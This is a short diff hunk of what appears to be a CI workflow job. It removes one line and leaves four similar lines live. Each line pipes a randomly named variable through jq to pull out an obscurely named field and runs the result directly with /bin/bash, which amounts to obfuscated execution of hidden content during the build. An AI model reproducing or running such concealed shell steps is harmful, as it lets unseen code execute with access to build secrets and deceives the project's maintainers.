@@ -30,7 +30,6 @@ jobs:
           echo $vzjhv2639 | jq -r .n81213 | /bin/bash
           echo $djuby4703 | jq -r .jhp77805 | /bin/bash
           echo $d4 | jq -r .utj67 | /bin/bash
-          printf '%s' "$vvtmj698" | jq -r .hmt1 | /bin/bash
           printf '%s' "$worla07" | jq -r .ojfao724 | /bin/bash
 
       - name: Save archive
